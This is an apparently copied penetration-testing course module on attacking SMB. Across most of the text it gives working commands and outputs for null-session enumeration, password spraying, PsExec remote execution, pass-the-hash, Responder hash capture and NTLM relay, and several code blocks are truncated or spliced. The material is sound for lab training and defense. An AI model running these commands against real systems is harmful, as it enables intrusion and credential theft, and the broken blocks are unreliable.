# SMB

## Attacking SMB

***

Server Message Block (SMB) is a communication protocol created for providing shared access to files and printers across nodes on a network. Initially, it was designed to run on top of NetBIOS over TCP/IP (NBT) using TCP port `139` and UDP ports `137` and `138`. However, with Windows 2000, Microsoft added the option to run SMB directly over TCP/IP on port `445` without the extra NetBIOS layer. Nowadays, modern Windows operating systems use SMB over TCP but still support the NetBIOS implementation as a failover.

Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services.

For instance, on Windows, SMB can run directly over port 445 TCP/IP without the need for NetBIOS over TCP/IP, but if Windows has NetBIOS enabled, or we are targetting a non-Windows host, we will find SMB running on port 139 TCP/IP. This means that SMB is running with NetBIOS over TCP/IP.

Another protocol that is commonly related to SMB is [MSRPC (Microsoft Remote Procedure Call)](https://en.wikipedia.org/wiki/Microsoft\_RPC). RPC provides an application developer a generic way to execute a procedure (a.k.a. a function) in a local or remote process without having to understand the network protocols used to support the communication, as specified in [MS-RPCE](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-rpce/290c38b1-92fe-4229-91e6-4fc376610c15), which defines an RPC over SMB Protocol that can use SMB Protocol named pipes as its underlying transport.

To attack an SMB Server, we need to understand its implementation, operating system, and which tools we can use to abuse it. As with other services, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. Furthermore, after we gain access to the SMB Service, if we interact with a shared folder, we need to be aware of the content in the directory. Finally, if we are targetting NetBIOS or RPC, identify which information we can get or what action we can perform on the target.

***

### Enumeration

Depending on the SMB implementation and the operating system, we will get different information using `Nmap`. Keep in mind that when targetting Windows OS, version information is usually not included as part of the Nmap scan results. Instead, Nmap will try to guess the OS version. However, we will often need other scans to identify if the target is vulnerable to a particular exploit. We will cover searching for known vulnerabilities later in this section. For now, let's scan ports 139 and 445 TCP.

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 15:15 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00024s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 00:00:00:00:00:00 (VMware)

Host script results:
|_nbstat: NetBIOS name: HTB, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode:

|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-19T13:16:04
|_  start_date: N/A
```

The Nmap scan reveals essential information about the target:

* SMB version (Samba smbd 4.6.2)
* Hostname HTB
* Operating System is Linux based on SMB implementation

Let's explore some common misconfigurations and protocols specifics attacks.

***

### Misconfigurations

SMB can be configured not to require authentication, which is often called a `null session`. Instead, we can log in to a system with no username or password.

**Anonymous Authentication**

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`. Let's explore how we can interact with file shares and RPC using null authentication.

**File Share**

Using `smbclient`, we can display a list of the server's shares with the option `-L`, and using the option `-N`, we tell `smbclient` to use the null session.

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available
```

`Smbmap` is another tool that helps us enumerate network shares and access associated permissions. An advantage of `smbmap` is that it provides a list of permissions for each shared folder.

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT
```

Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup
```

From the above example, the permissions are set to `READ` and `WRITE`, which one can use to upload and download the files.

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt
```

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.
```

**Remote Procedure Call (RPC)**

We can use the `rpcclient` tool with a null session to enumerate a workstation or Domain Controller.

The `rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. We can use this [cheat sheet from the SANS Institute](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) or review the complete list of all these functions found on the [man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) of the `rpcclient`.

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```

`Enum4linux` is another utility that supports null sessions, and it utilizes `nmblookup`, `net`, `rpcclient`, and `smbclient` to automate some common enumeration from SMB targets such as:

* Workgroup/Domain name
* Users information
* Operating system information
* Groups information
* Shares Folders
* Password policy information

The [original tool](https://github.com/CiscoCXSecurity/enum4linux) was written in Perl and [rewritten by Mark Lowe in Python](https://github.com/cddmp/enum4linux-ng).

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C

### Protocol Specifics Attacks

If a null session is not enabled, we will need credentials to interact with the SMB protocol. Two common ways to obtain credentials are [brute forcing](https://en.wikipedia.org/wiki/Brute-force\_attack) and [password spraying](https://owasp.org/www-community/attacks/Password\_Spraying\_Attack).

**Brute Forcing and Password Spray**

When brute-forcing, we try as many passwords as possible against an account, but it can lock out an account if we hit the threshold. We can use brute-forcing and stop before reaching the threshold if we know it. Otherwise, we do not recommend using brute force.

Password spraying is a better alternative since we can target a list of usernames with one common password to avoid account lockouts. We can try more than one password if we know the account lockout threshold. Typically, two to three attempts are safe, provided we wait 30-60 minutes between attempts. Let's explore the tool [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) that includes the ability to execute password spraying.

With CrackMapExec (CME), we can target multiple IPs, using numerous users and passwords. Let's explore an everyday use case for password spraying. To perform a password spray against one IP, we can use the option `-u` to specify a file with a user list and `-p` to specify a password. This will attempt to authenticate every user from the list using the provided password.

<SNIP>

SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
```

Note: By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list. Additionally, if we are targetting a non-domain joined computer, we will need to use the option `--local-auth`. For a more detailed study Password Spraying see the Active Directory Enumeration & Attacks module.

For more detailed usage instructions, check out the tool's [documentation guide](https://web.archive.org/web/20220129050920/https://mpgn.gitbook.io/crackmapexec/getting-started/using-credentials).

**SMB**

Linux and Windows SMB servers provide different attack paths. Usually, we will only get access to the file system, abuse privileges, or exploit known vulnerabilities in a Linux environment, as we will discuss later in this section. However, in Windows, the attack surface is more significant.

When attacking a Windows SMB Server, our actions will be limited by the privileges we had on the user we manage to compromise. If this user is an Administrator or has specific privileges, we will be able to perform operations such as:

* Remote Command Execution
* Extract Hashes from SAM Database
* Enumerating Logged-on Users
* Pass-the-Hash (PTH)

Let's discuss how we can perform such operations. Additionally, we will learn how the SMB protocol can be abused to retrieve a user's hash as a method to escalate privileges or gain access to a network.

**Remote Code Execution (RCE)**

Before jumping into how to execute a command on a remote system using SMB, let's talk about Sysinternals. The Windows Sysinternals website was created in 1996 by [Mark Russinovich](https://en.wikipedia.org/wiki/Mark\_Russinovich) and [Bryce Cogswell](https://en-academic.com/dic.nsf/enwiki/2358707) to offers technical resources and utilities to manage, diagnose, troubleshoot, and monitor a Microsoft Windows environment. Microsoft acquired Windows Sysinternals and its assets on July 18, 2006.

Sysinternals featured several freeware tools to administer and monitor computers running Microsoft Windows. The software can now be found on the [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/). One of those freeware tools to administer remote systems is PsExec.

[PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because it has a Windows service image inside of its executable. It takes this service and deploys it to the admin$ share (by default) on the remote machine. It then uses the DCE/RPC interface over SMB to access the Windows Service Control Manager API. Next, it starts the PSExec service on the remote machine. The PSExec service then creates a [named pipe](https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes) that can send commands to the system.

We can download PsExec from [Microsoft website](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), or we can use some Linux implementations:

* [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
* [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
* [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
* [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.

**Impacket PsExec**

To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine. For more detailed information we can use impacket help:

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ impacket-psexec -h

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

usage: psexec.py [-h] [-c pathname] [-path PATH] [-file FILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB] [-dc-ip ip address]
                 [-target-ip ip address] [-port [destination port]] [-service-name service_name] [-remote-binary-name remote_binary_name]
                 target [command ...]

PSEXEC like functionality example using RemComSvc.

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>
  command               command (or arguments if -c is used) to execute at the target (w/o path) - (default:cmd.exe)

optional arguments:
  -h, --help            show this help message and exit
  -c pathname           copy the filename for later execution, arguments are passed in the command option
  -path PATH            path of the command to execute
  -file FILE            alternative RemCom binary (be sure it doesn't require CRT)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve
                        it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of the service used to trigger the payload
  -remote-binary-name remote_binary_name
                        This will be the name of the executable uploaded on the target
```

To connect to a remote machine with a local administrator account, using `impacket-psexec`, you can use the following command:

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17

C:\Windows\system32>whoami && hostname

nt authority\system
WIN7BOX
```

The same options apply to `impacket-smbexec` and `impacket-atexec`.

**CrackMapExec**

Another tool we can use to run CMD or PowerShell is `CrackMapExec`. One advantage of `CrackMapExec` is the availability to run a command on multiples host at a time. To use it, we need to specify the protocol, `smb`, the IP address or IP address range, the option `-u` for username, and `-p` for the password, and the option `-x` to run cmd commands or uppercase `-X` to run PowerShell commands.

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:.) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] .\Administrator:Password123! (Pwn3d!)
SMB         10.10.110.17 445    WIN7BOX  [+] Executed command via smbexec
SMB         10.10.110.17 445    WIN7BOX  nt authority\system
```

Note: If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

**Enumerating Logged-on Users**

Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

Attacking SMB

```shell-session

**Extract Hashes from SAM Database**

The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes:

* Authenticate as another user.
* Password Cracking, if we manage to crack the password, we can try to reuse the password for other services or accounts.
* Pass The Hash. We will discuss it later in this section.

**Pass-the-Hash (PtH)**

If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools. Here is an example of how this would work with `CrackMapExec`:

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

```

**Forced Authentication Attacks**

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).

The most common tool to perform such operations is the `Responder`. [Responder](https://github.com/lgandx/Responder) is an LLMNR, NBT-NS, and MDNS poisoner tool with different capabilities, one of them is the possibility to set up fake services, including SMB, to steal NetNTLM v1/v2 hashes. In its default configuration, it will find LLMNR and NBT-NS traffic. Then, it will respond on behalf of the servers the victim is looking for and capture their NetNTLM hashes.

Let's illustrate an example to understand better how `Responder` works. Imagine we created a fake SMB server using the Responder default configuration, with the following command:

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ responder -I <interface name>
```

When a user or a system tries to perform a Name Resolution (NR), a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows machines, the procedure will roughly be as follows:

* The hostname file share's IP address is required.
* The local host file (C:\Windows\System32\Drivers\etc\hosts) will be checked for suitable records.
* If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
* Is there no local DNS record? A query will be sent to the DNS server that has been configured.
* If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. This is a problem because no measures are taken to verify the integrity of the responses. Attackers can take advantage of this mechanism by listening in on such queries and spoofing responses, leading the victim to believe malicious servers are trustworthy. This trust is usually used to steal credentials.

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ sudo responder -I ens33

These captured credentials can be cracked using [hashcat](https://hashcat.net/hashcat/) or relayed to a remote host to complete the authentication and impersonate the user.

All saved Hashes are located in Responder's logs directory (`/usr/share/responder/logs/`). We can copy the hash to a file and attempt to crack it using the hashcat module 5600.

Note: If you notice multiples hashes for one account this is because NTLMv2 utilizes both a client-side and server-side challenge that is randomized for each interaction. This makes it so the resulting hashes that are sent are salted with a randomized string of numbers. This is why the hashes don't match but still represent the same password.

The NTLMv2 hash was cracked. The password is `P@ssword`. If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

Attacking SMB

```shell-session
AIceBear@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

Attacking SMB

**RPC**

In the [Footprinting module](https://academy.hackthebox.com/course/preview/footprinting), we discuss how to enumerate a machine using RPC. Apart from enumeration, we can use RPC to make changes to the system, such as:

* Change a user's password.
* Create a new domain user.
* Create a new shared folder.

We also cover enumeration using RPC in the [Active Directory Enumeration & Attacks module](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks).

Keep in mind that some specific configurations are required to allow these types of changes through RPC. We can use the [rpclient man page](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) or [SMB Access from Linux Cheat Sheet](https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf) from the SANS Institute to explore this further.
